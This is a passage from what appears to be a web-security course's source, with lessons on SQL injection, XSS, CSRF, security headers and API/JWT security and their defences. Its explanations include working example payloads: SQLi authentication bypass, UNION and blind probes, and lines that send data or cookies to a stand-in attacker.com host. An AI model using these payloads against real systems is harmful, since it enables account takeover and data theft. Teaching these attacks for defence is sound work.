<li><strong>OWASP Top 10:</strong> The ten most critical web application security risk categories — the foundation of web security education and compliance.</li>
<li><strong>Broken Access Control:</strong> The #1 risk in 2021 — failing to enforce who can access what, enabling horizontal and vertical privilege escalation.</li>
<li><strong>Threat modelling:</strong> Systematically identifying threats before building — STRIDE is the most widely used framework.</li>
<li><strong>STRIDE:</strong> Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege — six threat categories to evaluate for every system component.</li>
<li><strong>Attack surface:</strong> Every entry point an attacker could target — inputs, APIs, dependencies, infrastructure, and people.</li>
<li><strong>Security by design:</strong> Embedding security decisions into architecture and design rather than retrofitting controls after the fact.</li>
<li><strong>Defence in depth:</strong> Layering multiple independent security controls so that bypassing one does not compromise the whole system.</li>
<li><strong>Principle of least privilege:</strong> Every user, service, and process should have only the minimum access rights needed to perform its function.</li>
<li><strong>Supply chain attack:</strong> Compromising the software build or distribution pipeline to inject malicious code into trusted software — SolarWinds is the canonical example.</li>
<li><strong>SSRF:</strong> Server-Side Request Forgery — the server makes a request to an attacker-controlled URL, potentially exposing internal services and cloud metadata.</li>
<li><strong>Security misconfiguration:</strong> Leaving default settings, overly permissive access, or unnecessary features enabled — the highest-prevalence finding in penetration tests.</li>
</ul>`,

  8: `<p><strong>SQL injection (SQLi)</strong> is one of the oldest and most devastating web vulnerabilities — it has been in the OWASP Top 10 since the list was first published in 2003 and remains responsible for some of the largest data breaches in history. In 2008, a single SQLi attack compromised 130 million credit card numbers from Heartland Payment Systems. In 2012, a SQLi attack on LinkedIn exposed 6.5 million password hashes. Despite being fully preventable, SQLi attacks still account for a significant percentage of all web application breaches today.</p>
<p>The vulnerability is conceptually simple: when user input is concatenated directly into a SQL query string, the attacker can break out of the intended data context and inject their own SQL commands. The database cannot distinguish between the developer's legitimate SQL and the attacker's injected commands — it executes them both.</p>

<h5 class="content-heading">From Basic to Advanced SQLi — How Attacks Progress</h5>
<p><strong>Classic in-band SQLi</strong> — The most straightforward form. The application displays database results directly in the response. Consider this login query:</p>
<p><code>SELECT * FROM users WHERE email='[INPUT]' AND password='[INPUT]'</code></p>
<p>Injecting <code>' OR '1'='1' --</code> as the email produces: <code>SELECT * FROM users WHERE email='' OR '1'='1' --' AND password='...'</code>. The <code>--</code> is a SQL comment, making everything after it ignored. The condition <code>'1'='1'</code> is always true — this query returns all users. The first one in the result set (often the admin account) is logged in. The attacker has bypassed authentication completely without knowing any password.</p>
<p><strong>UNION-based SQLi</strong> — When the application displays query results, the attacker can append a UNION SELECT to extract data from arbitrary tables: <code>' UNION SELECT username, password, NULL FROM admin_users --</code>. If the columns match, the admin credentials appear alongside the normal query results. This technique allows dumping entire database tables.</p>
<p><strong>Blind Boolean-based SQLi</strong> — The application does not show query results, but its behaviour differs based on whether the query returns true or false. The attacker asks yes/no questions: <code>' AND SUBSTRING((SELECT password FROM users WHERE id=1),1,1)='a' --</code>. If the page loads normally, the first character of the password is 'a'. If not, try 'b'. Tedious but completely automatable with tools like sqlmap — entire databases can be extracted this way.</p>
<p><strong>Blind Time-based SQLi</strong> — When even true/false differences are invisible, the attacker uses database sleep functions: <code>' AND SLEEP(5) --</code> (MySQL). If the response takes 5 seconds, the injection worked. From there, conditional delays encode binary data: <code>' AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0) --</code>. Each character takes ~26 guesses on average — automated tools like sqlmap handle this at high speed.</p>
<p><strong>Second-order SQLi</strong> — The payload is stored in the database in a first request (safely escaped at that point) and then used unsafely in a later query. Example: a username containing <code>admin'--</code> is stored safely. But when the app later builds a query using the stored username — perhaps for a password change — the injection fires. Second-order SQLi is particularly dangerous because it bypasses input validation at the storage stage.</p>
<p><strong>Out-of-band SQLi (OOB)</strong> — The attacker triggers the database to make an outbound DNS or HTTP request to an attacker-controlled server, carrying data as part of the URL. On MySQL: <code>SELECT LOAD_FILE(CONCAT('\\\\\\\\',version(),'.attacker.com\\\\test'))</code>. This bypasses firewalls that block inbound connections and is extremely difficult to detect in standard application logs.</p>

<h5 class="content-heading">The Fix: Parameterised Queries Are Non-Negotiable</h5>
<p>Parameterised queries (prepared statements) are the only reliable fix. The query structure is sent to the database first; user input is sent separately as typed data. The database never parses user input as SQL — it is impossible for injection to occur, regardless of what characters the user submits.</p>
<p>Node.js with <code>pg</code> (PostgreSQL): <code>await pool.query('SELECT * FROM users WHERE email = $1', [userEmail])</code>. The <code>$1</code> is a parameter placeholder — the value is bound separately.</p>
<p>Python with psycopg2: <code>cursor.execute("SELECT * FROM users WHERE email = %s", (user_email,))</code>. Note the trailing comma — this must be a tuple, not a string.</p>
<p>Java with JDBC: <code>PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE email = ?"); stmt.setString(1, userEmail);</code></p>
<p>ORMs like Sequelize, SQLAlchemy, and Hibernate use parameterised queries internally for their standard find methods. Only raw query helpers (<code>sequelize.query()</code>, <code>session.execute(text(...))</code>) require explicit parameterisation — these are a common source of SQLi in ORM-heavy codebases.</p>

<h5 class="content-heading">Defence in Depth</h5>
<p>Beyond parameterised queries, apply layered defences:</p>
<ul class="content-list">
<li><strong>Principle of least privilege:</strong> The database user your application connects with should only have SELECT/INSERT/UPDATE/DELETE on specific tables it needs. It should never have DROP, ALTER, or access to system tables. An attacker who achieves SQLi with a limited DB user can do far less damage.</li>
<li><strong>Web Application Firewall (WAF):</strong> A WAF can detect and block common SQLi payloads, but should not be your primary defence — a skilled attacker can often bypass WAFs with obfuscation techniques.</li>
<li><strong>Input validation:</strong> Validate that input matches expected format (e.g. email fields must look like emails). This reduces attack surface but is not a substitute for parameterised queries.</li>
<li><strong>Error handling:</strong> Never return raw database errors to the client — they reveal schema structure, table names, and sometimes data. Log errors server-side and return only generic error messages to users.</li>
<li><strong>Regular testing:</strong> Use sqlmap or Burp Suite Pro during penetration testing to automatically probe for SQLi. Consider integrating SAST (Static Application Security Testing) tools into your CI pipeline.</li>
</ul>

<h5 class="content-heading">Key Concepts</h5>
<ul class="content-list">
<li><strong>SQL injection:</strong> Inserting malicious SQL into input that is concatenated into a query — allows authentication bypass, data extraction, and sometimes full server compromise.</li>
<li><strong>Parameterised query:</strong> Query structure and user data sent to the DB separately — user input is never parsed as SQL. The only reliable SQLi defence.</li>
<li><strong>UNION-based SQLi:</strong> Appending a UNION SELECT to extract data from other tables when results are displayed in the response.</li>
<li><strong>Blind SQLi:</strong> Inferring data without seeing results — using true/false page differences or time delays to extract data one bit at a time.</li>
<li><strong>Time-based SQLi:</strong> Using database SLEEP() or WAITFOR DELAY to encode data in response timing — effective when no visual difference exists.</li>
<li><strong>Second-order SQLi:</strong> Payload stored safely, then used unsafely in a later query — bypasses point-of-entry validation.</li>
<li><strong>Principle of least privilege:</strong> DB application user should have only the minimum permissions needed — limits blast radius of any injection attack.</li>
<li><strong>sqlmap:</strong> Open-source tool that automatically detects and exploits SQLi vulnerabilities — used by penetration testers to verify defences.</li>
<li><strong>ORM:</strong> Object-Relational Mapper — generates SQL from method calls, using parameterised queries internally. Only raw query methods require explicit parameterisation.</li>
<li><strong>WAF:</strong> Web Application Firewall — can block common SQLi patterns but should not be the primary defence as obfuscated payloads can bypass rules.</li>
<li><strong>Error handling:</strong> Never expose raw DB errors to clients — they reveal schema information. Log server-side, return generic messages to users.</li>
</ul>`,

  9: `<p><strong>Cross-Site Scripting (XSS)</strong> is the injection of malicious JavaScript into web pages that are then viewed by other users. It is consistently in the OWASP Top 10 and is the most widespread client-side vulnerability on the web. When a browser executes attacker-controlled JavaScript in the context of your site, the attacker has the same access as your legitimate code — your cookies, local storage, DOM, keyboard input, and camera/microphone permissions. XSS is not just a nuisance; it is a complete account takeover vulnerability.</p>
<p>The Samy worm in 2005 demonstrated XSS at scale: a self-propagating XSS worm on MySpace added "Samy is my hero" to every infected profile and propagated itself to the viewer's friends list. It infected over one million profiles in under 20 hours — the fastest-spreading internet worm in history at that point.</p>

<h5 class="content-heading">The Three Types of XSS</h5>
<p><strong>Stored XSS (Persistent XSS)</strong> — The most dangerous form. The malicious payload is saved to the server's database and served to every user who views the affected page. A comment field that allows HTML is the classic example: the attacker posts a comment containing <code>&lt;script&gt;document.location='https://attacker.com/steal?c='+document.cookie&lt;/script&gt;</code>. Every user who loads that page sends their session cookie to the attacker's server. The attacker can then impersonate them without knowing their password.</p>
<p>The 2018 British Airways breach — 400,000 customer payment card records stolen — was Stored XSS combined with Magecart (a skimming script injected through a compromised third-party library). The attacker replaced a single JavaScript file served to every checkout page visitor. For 15 days, every card detail entered on the checkout page was silently exfiltrated to a server in Moldova.</p>
<p><strong>Reflected XSS (Non-Persistent XSS)</strong> — The payload is embedded in a URL and reflected in the server's response without being stored. The attacker crafts a malicious link — <code>https://vulnerable.com/search?q=&lt;script&gt;...&lt;/script&gt;</code> — and tricks the victim into clicking it (via email, social media, or shortened URLs). The server includes the search term verbatim in the response HTML, and the browser executes it. The attack is "one-shot" — it only fires for users who click that specific link.</p>
<p><strong>DOM-Based XSS</strong> — The vulnerability exists entirely in client-side JavaScript. The server response is safe, but client-side code reads attacker-controlled data (typically from the URL fragment or localStorage) and inserts it into the DOM unsafely. Example: <code>document.getElementById('msg').innerHTML = location.hash.substring(1);</code> — visiting <code>page.html#&lt;img src=x onerror=alert(1)&gt;</code> executes the payload without any server involvement. DOM XSS is harder to detect because it does not appear in server logs.</p>

<h5 class="content-heading">What an Attacker Can Do with XSS</h5>
<p>With JavaScript execution in a victim's browser context, an attacker can:</p>
<ul class="content-list">
<li><strong>Session hijacking:</strong> Read non-HttpOnly cookies and send them to an attacker-controlled server — the attacker can log in as the victim from their own browser.</li>
<li><strong>Credential harvesting:</strong> Replace the login form with a fake one that sends credentials to the attacker, then redirects to the real login — the victim sees nothing unusual.</li>
<li><strong>Keylogging:</strong> Attach a <code>keydown</code> event listener to <code>document</code> and exfiltrate every keypress — captures passwords typed on the page even if the session cookie is HttpOnly.</li>
<li><strong>Cryptomining:</strong> Run a JavaScript cryptocurrency miner, consuming the victim's CPU for as long as the tab is open.</li>
<li><strong>Webcam/microphone access:</strong> If the site has camera permissions, the attacker can invoke <code>getUserMedia()</code> and stream the feed to their server.</li>
<li><strong>BeEF framework attacks:</strong> The Browser Exploitation Framework hooks the victim's browser, providing persistent control and access to dozens of browser-based attacks.</li>
</ul>

<h5 class="content-heading">Defences — Layered Security</h5>
<p><strong>Output encoding</strong> is the primary defence for server-side rendered content. Every piece of untrusted data inserted into HTML must be HTML-entity encoded: <code>&lt;</code> → <code>&amp;lt;</code>, <code>&gt;</code> → <code>&amp;gt;</code>, <code>&amp;</code> → <code>&amp;amp;</code>, <code>"</code> → <code>&amp;quot;</code>. Modern templating engines (Jinja2, Handlebars, Twig, EJS) do this by default — only explicitly unescaped syntax (<code>{{{ }}}</code> in Handlebars, <code>| safe</code> in Jinja2) bypasses it. In React, JSX automatically escapes values — only <code>dangerouslySetInnerHTML</code> bypasses this protection and should almost never be used with user data.</p>
<p><strong>Content Security Policy (CSP)</strong> is the most powerful second layer. A properly configured CSP header tells the browser which sources of JavaScript are legitimate: <code>Content-Security-Policy: script-src 'nonce-RANDOM123' 'strict-dynamic'</code>. Scripts without the correct nonce are refused by the browser — even if an attacker injects a <code>&lt;script&gt;</code> tag, it will not execute. Nonces must be random and unique per page load. CSP can also block inline event handlers (<code>onclick="..."</code>) and <code>eval()</code>, which are common XSS execution vectors.</p>
<p><strong>HttpOnly cookie flag</strong> prevents JavaScript from reading session cookies via <code>document.cookie</code>. This removes the most common XSS objective — session hijacking — but does not prevent other XSS attacks. Always set this flag on session cookies.</p>
<p><strong>DOMPurify</strong> — When you genuinely need to render user-supplied HTML (rich text editors, markdown renderers), use the DOMPurify library to sanitise the HTML before insertion. It maintains an allowlist of safe tags and attributes and removes everything else: <code>const clean = DOMPurify.sanitize(dirtyHTML);</code></p>
<p><strong>Subresource Integrity (SRI)</strong> — If you load JavaScript from a CDN, add an <code>integrity</code> attribute to your script tag containing the SHA-256 hash of the file. If the CDN is compromised and serves a modified file, the browser computes a different hash and refuses to execute it — preventing the British Airways style attack.</p>

<h5 class="content-heading">Key Concepts</h5>
<ul class="content-list">
<li><strong>XSS (Cross-Site Scripting):</strong> Injecting malicious JavaScript into a page viewed by other users — gives the attacker the same access as legitimate scripts on the page.</li>
<li><strong>Stored XSS:</strong> Payload persisted in the database and served to all visitors — the most impactful XSS type, used in the British Airways breach.</li>
<li><strong>Reflected XSS:</strong> Payload embedded in a URL and reflected in the response — requires tricking the victim into clicking the malicious link.</li>
<li><strong>DOM-based XSS:</strong> Vulnerability in client-side JS that reads attacker-controlled data (URL hash, localStorage) and inserts it into the DOM unsafely.</li>
<li><strong>Output encoding:</strong> HTML-entity escaping untrusted data before inserting into HTML — the primary XSS defence. Enabled by default in modern templating engines.</li>
<li><strong>Content Security Policy:</strong> HTTP header instructing browsers to only execute scripts from approved sources — blocks XSS payload execution even if injection occurs.</li>
<li><strong>CSP nonce:</strong> A random value included in both the CSP header and each legitimate script tag — allows those scripts while blocking all others.</li>
<li><strong>HttpOnly flag:</strong> Prevents JavaScript from reading the cookie — removes session hijacking as an XSS objective but does not prevent all XSS attacks.</li>
<li><strong>DOMPurify:</strong> JavaScript library that sanitises HTML by removing dangerous tags and attributes — use when rendering user-supplied HTML is unavoidable.</li>
<li><strong>SRI (Subresource Integrity):</strong> Hash in script tag's integrity attribute ensures CDN-served files have not been tampered with.</li>
<li><strong>Samy worm:</strong> 2005 self-propagating XSS worm that infected 1 million MySpace profiles in 20 hours — demonstrates XSS at scale.</li>
</ul>`,

  10: `<p><strong>Cross-Site Request Forgery (CSRF)</strong> is a browser-level attack that exploits the fact that browsers automatically include cookies with every request to a domain — even requests initiated from a completely different site. An attacker who gets a victim to visit a malicious page can silently trigger authenticated actions on any site the victim is logged into: transfer money, change their email or password, delete accounts, post content, or make purchases — all without the victim's knowledge.</p>
<p>CSRF was responsible for the 2008 attack on a major router vendor where a malicious page caused all routers that viewed it to change their DNS settings, redirecting users from their bank's real website to phishing pages. Every authenticated web app that allows state-changing operations is potentially vulnerable.</p>

<h5 class="content-heading">How CSRF Works — Mechanics</h5>
<p><strong>GET-based CSRF</strong> (the simplest form): If your application allows state-changing operations via GET requests (which it should not — but many do), the attack is a single HTML image tag: <code>&lt;img src="https://bank.com/transfer?to=attacker&amount=1000"&gt;</code>. The moment the victim's browser renders this tag (even if the "image" fails), it fires a GET request with the victim's session cookie attached. The bank's server sees a valid authenticated request and processes the transfer.</p>
<p><strong>POST-based CSRF</strong>: Most apps correctly use POST for state changes, but this is still bypassable. A hidden auto-submitting form on the attacker's page:</p>
<p><code>&lt;form action="https://bank.com/transfer" method="POST" id="f"&gt;&lt;input name="to" value="attacker"&gt;&lt;input name="amount" value="1000"&gt;&lt;/form&gt;&lt;script&gt;document.getElementById('f').submit()&lt;/script&gt;</code></p>
<p>When the victim visits the malicious page, the form submits silently and the bank receives a valid POST with the victim's cookies.</p>
<p><strong>JSON/API CSRF</strong>: If your API accepts <code>application/x-www-form-urlencoded</code> or <code>text/plain</code> content types (which browsers can send cross-origin), it may be vulnerable to CSRF even if it expects JSON. Always explicitly validate <code>Content-Type: application/json</code> and reject other content types for JSON endpoints.</p>

<h5 class="content-heading">CSRF Defences</h5>
<p><strong>SameSite Cookie Attribute</strong> — The modern, clean solution. Setting <code>SameSite=Strict</code> on your session cookie tells the browser to never send the cookie on cross-site requests — CSRF is completely prevented. <code>SameSite=Lax</code> (the browser default since 2020) allows cookies on top-level navigation (e.g. clicking a link) but blocks them in iframes, forms, and subresource requests — blocking CSRF for POST requests but not GET. Use <code>SameSite=Strict</code> for maximum security; use <code>Lax</code> if you need to maintain sessions when users click links from external sites.</p>
<p><strong>CSRF Tokens (Synchronizer Token Pattern)</strong> — For older browsers that do not fully support SameSite, or as a defence-in-depth layer: generate a random token per session (or per form), embed it in every state-changing form as a hidden field, and verify it on the server before processing. The attacker cannot read the token from their origin (same-origin policy), so they cannot forge the correct value. Frameworks: Django uses this by default (<code>{% csrf_token %}</code>), Rails uses the <code>authenticity_token</code>, Laravel uses <code>@csrf</code>. If you are building an API, send the token in a custom header (e.g. <code>X-CSRF-Token</code>) — custom headers cannot be sent cross-origin by the browser.</p>
<p><strong>Double Submit Cookie Pattern</strong> — For stateless APIs: generate a random value, set it as a cookie AND include it as a request header. The server checks they match. Because the attacker cannot read your cookie (same-origin policy), they cannot set the matching header. This is less secure than synchronizer tokens but works for stateless architectures.</p>

<h5 class="content-heading">Clickjacking</h5>
<p>Clickjacking is a visual deception attack where the attacker embeds your site in a transparent iframe and lays it over a decoy UI. The victim thinks they are clicking a button on the attacker's page but are actually clicking on elements of your site. This can be used to trigger purchases, change settings, or grant permissions. The defence: set <code>X-Frame-Options: DENY</code> (or <code>SAMEORIGIN</code> if you need to iframe your own pages) or use the <code>frame-ancestors</code> CSP directive. These prevent your pages from being loaded in iframes entirely.</p>

<h5 class="content-heading">Broken Authentication and Session Management</h5>
<p>Authentication flaws are distinct from CSRF but equally critical. The most impactful issues:</p>
<p><strong>Session fixation</strong>: An attacker pre-sets a known session ID (e.g. by embedding it in a URL they send the victim). The victim authenticates — if the app does not rotate the session ID on login, the attacker now has a valid authenticated session. Fix: always call <code>session.regenerate()</code> (or equivalent) immediately after a successful login.</p>
<p><strong>Session token entropy</strong>: Session IDs must be generated by a CSPRNG. A 128-bit random token is unguessable. A timestamp-based or sequential session ID is trivially predictable and can be brute-forced. Node.js express-session uses 24 bytes of <code>crypto.randomBytes()</code> by default — never override this with a weaker generator.</p>
<p><strong>Credential stuffing</strong>: Attackers download leaked credential databases (billions of username/password pairs from previous breaches like LinkedIn 2012, Yahoo 2013, Adobe 2013) and automatically test them against your login form. If users reuse passwords (most do), many accounts will be compromised. Defences: rate limiting on login endpoints, MFA, integration with HaveIBeenPwned's API to check if a user's email/password appears in known breaches.</p>
<p><strong>Multi-factor authentication (MFA)</strong> is the single highest-impact authentication control. Microsoft's research shows MFA blocks 99.9% of automated account compromise attacks. Even if an attacker has the user's password, they cannot log in without the second factor (TOTP app, hardware security key, SMS). Implement MFA using the TOTP standard (RFC 6238) — libraries: <code>speakeasy</code> (Node.js), <code>pyotp</code> (Python). Prefer authenticator apps or hardware keys over SMS (SIM-swapping attacks can intercept SMS codes).</p>

<h5 class="content-heading">Key Concepts</h5>
<ul class="content-list">
<li><strong>CSRF:</strong> Forging authenticated requests by exploiting automatic cookie attachment — browsers cannot distinguish legitimate from forged requests without additional controls.</li>
<li><strong>SameSite cookie:</strong> Attribute controlling when cookies are sent on cross-site requests — <code>Strict</code> blocks all cross-site requests, <code>Lax</code> blocks most. The modern CSRF defence.</li>
<li><strong>CSRF token:</strong> Random value embedded in forms and verified server-side — attacker cannot read it from their origin so cannot forge the correct value.</li>
<li><strong>Double submit cookie:</strong> Stateless CSRF defence — random value set as both cookie and request header; server verifies they match.</li>
<li><strong>Clickjacking:</strong> Transparent iframe overlay attack — mitigated by X-Frame-Options or CSP frame-ancestors directive.</li>
<li><strong>Session fixation:</strong> Attacker pre-sets a session ID before authentication — fix by regenerating the session ID on every successful login.</li>
<li><strong>Session entropy:</strong> Session IDs must be generated by a CSPRNG — sequential or timestamp-based IDs are predictable and brute-forceable.</li>
<li><strong>Credential stuffing:</strong> Automated testing of breached username/password pairs — mitigated by rate limiting, MFA, and breach database integration.</li>
<li><strong>MFA (Multi-Factor Authentication):</strong> Requiring a second proof of identity beyond password — blocks 99.9% of automated account takeover attacks.</li>
<li><strong>TOTP:</strong> Time-based One-Time Password — the standard behind authenticator apps like Google Authenticator and Authy (RFC 6238).</li>
<li><strong>HaveIBeenPwned:</strong> Troy Hunt's service/API that checks if email/password appears in known breach databases — integrate into registration and login to warn users.</li>
</ul>`,

  11: `<p>HTTP security headers are among the highest-value security improvements available to web developers. A few header lines in your server configuration or application middleware can mitigate entire vulnerability categories — clickjacking, MIME confusion attacks, protocol downgrade attacks, and sensitive data leakage — at essentially zero performance cost. Yet many production applications leave these headers unconfigured. Tools like <a href="https://securityheaders.com">securityheaders.com</a> and <a href="https://observatory.mozilla.org">Mozilla Observatory</a> score your headers instantly — aim for at least a B grade before launching any production application.</p>
<p>Understanding not just <em>what</em> each header does but <em>why</em> is essential. Each header was created in response to a real attack vector that browsers could not defend against any other way.</p>

<h5 class="content-heading">Content Security Policy (CSP) — The Most Powerful Header</h5>
<p><strong>Content-Security-Policy</strong> instructs the browser about which sources of content are trusted for your page. Any content not matching the policy — inline scripts, scripts from unauthorised domains, eval() calls — is blocked before execution. CSP is the primary browser-side defence against XSS: even if an attacker successfully injects a <code>&lt;script&gt;</code> tag, CSP prevents it from executing.</p>
<p>Key CSP directives:</p>
<ul class="content-list">
<li><strong>default-src 'self':</strong> The fallback policy for any resource type not explicitly specified — <code>'self'</code> means only your own origin.</li>
<li><strong>script-src:</strong> Controls JavaScript sources. <code>'nonce-RANDOM'</code> allows only scripts with the matching nonce attribute. <code>'strict-dynamic'</code> (with a nonce) allows scripts loaded by trusted scripts, enabling modern SPAs without whitelisting every CDN.</li>
<li><strong>style-src:</strong> Controls CSS sources. Be careful with <code>'unsafe-inline'</code> — inline styles can be used for data exfiltration via CSS injection attacks.</li>
<li><strong>img-src:</strong> Controls image sources. Restricting this prevents attackers from using your site to make outbound requests via <code>&lt;img&gt;</code> tags.</li>
<li><strong>connect-src:</strong> Controls which origins fetch(), XHR, and WebSocket can connect to — prevents data exfiltration to attacker servers.</li>
<li><strong>frame-ancestors 'none':</strong> Modern replacement for X-Frame-Options — prevents your page from being framed.</li>
<li><strong>report-uri / report-to:</strong> Sends CSP violation reports to a logging endpoint — essential for monitoring and policy tuning.</li>
</ul>
<p>Starting CSP: use <code>Content-Security-Policy-Report-Only</code> with a <code>report-uri</code> to log violations without blocking anything. Analyse the reports for 1-2 weeks to understand your application's actual content sources. Then switch to enforcement mode. A strict nonce-based CSP from Google's security team looks like: <code>script-src 'nonce-{RANDOM}' 'strict-dynamic' https:; object-src 'none'; base-uri 'none';</code></p>

<h5 class="content-heading">HSTS — HTTP Strict Transport Security</h5>
<p><strong>Strict-Transport-Security: max-age=31536000; includeSubDomains; preload</strong></p>
<p>HSTS tells browsers to only connect to your site via HTTPS, never HTTP — even if the user types <code>http://</code> in the address bar. The <code>max-age</code> is in seconds (31536000 = 1 year). After the first HTTPS visit, the browser enforces HTTPS internally for the specified period, without even sending a request to your server — this eliminates SSL stripping attacks.</p>
<p><code>includeSubDomains</code> applies the policy to all subdomains. <code>preload</code> opts your domain into browser vendors' HSTS preload lists — Chrome, Firefox, and Safari ship with a list of domains that must always use HTTPS, covering even first visits. Submit your domain at <a href="https://hstspreload.org">hstspreload.org</a>. Once submitted and propagated, your site cannot be reached over HTTP on any browser — this is permanent, so ensure all subdomains support HTTPS before preloading.</p>
<p>Without HSTS, an SSL stripping attack on an unsecured network can intercept the first HTTP request (before the HTTPS redirect) and proxy the connection in cleartext — the user never sees a warning.</p>

<h5 class="content-heading">X-Frame-Options and Clickjacking Prevention</h5>
<p><strong>X-Frame-Options: DENY</strong> prevents your page from being loaded in any iframe — blocking clickjacking attacks entirely. <strong>SAMEORIGIN</strong> allows iframing only by your own domain. The CSP <code>frame-ancestors</code> directive is the modern equivalent with finer-grained control (supports specific domain allowlists), but X-Frame-Options is still needed for older browsers.</p>

<h5 class="content-heading">X-Content-Type-Options: nosniff</h5>
<p>Browsers historically tried to "sniff" the content type of a response if the <code>Content-Type</code> header was missing or incorrect — a feature designed to help render malformed responses. Attackers exploited this: upload a polyglot file (e.g. an image that is also valid JavaScript), serve it with <code>Content-Type: image/jpeg</code>, but if the browser sniffs it as JavaScript and executes it, XSS occurs. The <code>nosniff</code> directive tells the browser to respect the declared MIME type exactly and never guess. Always include this header.</p>

<h5 class="content-heading">Referrer-Policy</h5>
<p>When a user clicks a link on your page, the browser sends a <code>Referer</code> header to the destination containing your page's URL. If your URL contains sensitive parameters (session tokens, password reset tokens, user IDs), this header leaks them to third parties. Recommended: <code>Referrer-Policy: strict-origin-when-cross-origin</code> — sends the full URL for same-origin requests (useful for analytics) but only the origin (no path/query) for cross-origin requests.</p>

<h5 class="content-heading">Permissions-Policy (formerly Feature-Policy)</h5>
<p><strong>Permissions-Policy</strong> controls which browser features your page can use — and which are blocked. This prevents malicious iframes or injected scripts from accessing sensitive browser APIs: <code>Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()</code> disables camera, microphone, geolocation, and payment APIs for your entire page including any iframes it loads. A principle of least privilege for browser features.</p>

<h5 class="content-heading">Hiding Server Information</h5>
<p>Every bit of information about your server technology helps an attacker target known vulnerabilities. Remove or falsify these headers: <strong>Server</strong> (reveals "nginx/1.18.0", "Apache/2.4.51"), <strong>X-Powered-By</strong> (reveals "PHP/8.1.0", "Express"). In Express: <code>app.disable('x-powered-by')</code> or use the <code>helmet</code> middleware. In nginx: <code>server_tokens off;</code>. These are trivial to configure and reduce attacker reconnaissance.</p>

<h5 class="content-heading">Quick Implementation with Helmet.js</h5>
<p>For Node.js/Express applications, the <code>helmet</code> package sets 15+ security headers in one line: <code>app.use(helmet())</code>. It enables HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, and more with secure defaults. You can customise individual headers: <code>helmet.contentSecurityPolicy({ directives: { ... } })</code>. Every Express application should use helmet as a baseline — add it before any routes are defined.</p>

<h5 class="content-heading">Key Concepts</h5>
<ul class="content-list">
<li><strong>Content-Security-Policy:</strong> Instructs browsers which content sources are trusted — blocks XSS payload execution even after successful injection.</li>
<li><strong>CSP nonce:</strong> Cryptographically random per-request value in both the header and legitimate script tags — allows those scripts while blocking all others.</li>
<li><strong>report-only mode:</strong> CSP header variant that logs but does not block violations — use during policy development to avoid breaking your app.</li>
<li><strong>HSTS:</strong> Forces HTTPS for the max-age period — browser enforces HTTPS locally, eliminating SSL stripping attacks and redirect interception.</li>
<li><strong>HSTS preload:</strong> Opt-in list built into browsers ensuring your domain is HTTPS-only even on first visits — permanent and irreversible until removed from the list.</li>
<li><strong>X-Frame-Options:</strong> Prevents your page from being framed — blocks clickjacking. DENY blocks all; SAMEORIGIN allows same-origin iframes.</li>
<li><strong>X-Content-Type-Options: nosniff:</strong> Prevents MIME sniffing — browser uses only the declared Content-Type, never guesses.</li>
<li><strong>Referrer-Policy:</strong> Controls how much URL information is leaked to external sites via the Referer header — protects sensitive URL parameters.</li>
<li><strong>Permissions-Policy:</strong> Restricts which browser APIs (camera, microphone, geolocation) the page and its iframes can access — principle of least privilege for browser features.</li>
<li><strong>Helmet.js:</strong> Node.js middleware that sets 15+ security headers with secure defaults in a single line — baseline for all Express applications.</li>
<li><strong>SSL stripping:</strong> MITM attack that downgrades HTTPS to HTTP by intercepting the first HTTP request before the HTTPS redirect — prevented by HSTS.</li>
<li><strong>Server information disclosure:</strong> Server and X-Powered-By headers revealing stack details — remove to reduce attacker reconnaissance.</li>
</ul>`,

  12: `<p>APIs are the attack surface of the modern web. As applications shift to SPAs, mobile apps, and microservices, the entire security boundary moves to the API layer. The OWASP API Security Top 10 (2023 edition) addresses vulnerabilities unique to or more prevalent in API contexts — most of which differ meaningfully from the standard OWASP Top 10 because APIs operate without the natural friction of traditional web forms and browser-enforced boundaries.</p>
<p>A single poorly secured API endpoint can expose the entire data model of an application. The 2019 Facebook API vulnerability exposed 540 million user records. The 2020 Venmo API allowed enumeration of all public transactions — researchers used it to identify business relationships, drug purchases, and political donations. The 2023 T-Mobile API breach exposed 37 million accounts. API security is not optional.</p>

<h5 class="content-heading">OWASP API Top 10 — The Critical Risks</h5>
<p><strong>API1 — Broken Object Level Authorization (BOLA)</strong>: The most prevalent API vulnerability. The server exposes object references (IDs) but fails to verify the requesting user owns or has permission to access that object. Example: <code>GET /api/orders/1234</code> — if changing 1234 to any other ID returns that order regardless of ownership, every order in your database is exposed. Fix: always verify ownership server-side on every request; never trust the client to enforce access control.</p>
<p><strong>API2 — Broken Authentication</strong>: Weak API keys, no token expiry, sensitive tokens in URLs (appear in server logs and browser history), missing brute-force protection on authentication endpoints. JWTs accepted without signature verification. Fix: use short-lived tokens (15 minutes for access tokens), enforce HTTPS-only token transmission, implement rate limiting on authentication endpoints.</p>
<p><strong>API3 — Broken Object Property Level Authorization</strong>: The API exposes more data than needed. A <code>GET /users/123</code> endpoint returns the full user object including password hash, internal flags, admin notes — fields the client should never see. Mass assignment: a <code>PUT /users/123</code> endpoint that updates any provided field, including <code>isAdmin: true</code>. Fix: explicitly specify which fields are included in each response; use allowlists for updateable fields, never blocklists.</p>
<p><strong>API4 — Unrestricted Resource Consumption</strong>: No rate limiting on expensive operations — file uploads, image processing, email sending, payment processing. An attacker can exhaust your infrastructure by spamming expensive endpoints. Fix: rate limit at multiple levels (IP, user, endpoint), set file size and payload limits, implement request queuing for expensive operations.</p>
<p><strong>API5 — Broken Function Level Authorization</strong>: Admin functions exposed but not properly secured — e.g. <code>DELETE /api/users/:id</code> accessible to regular users if they know the endpoint exists. Common in APIs that handle multiple user roles. Fix: enforce role-based access control on every endpoint; never rely on obscurity of the endpoint URL as security.</p>

<h5 class="content-heading">JWT Security — A Deep Dive</h5>
<p>JSON Web Tokens are the dominant stateless authentication mechanism for APIs, but they have several critical implementation pitfalls that have led to major breaches:</p>
<p><strong>The alg:none attack</strong>: The JWT header specifies the signature algorithm. If a library accepts <code>"alg": "none"</code>, an attacker can craft a token without a signature — bypassing verification entirely. The payload is just base64-encoded, not encrypted, so the attacker can set <code>"role": "admin"</code>. Fix: explicitly specify which algorithms you accept; reject tokens with <code>alg:none</code>. In Node.js: <code>jwt.verify(token, secret, { algorithms: ['HS256'] })</code>.</p>
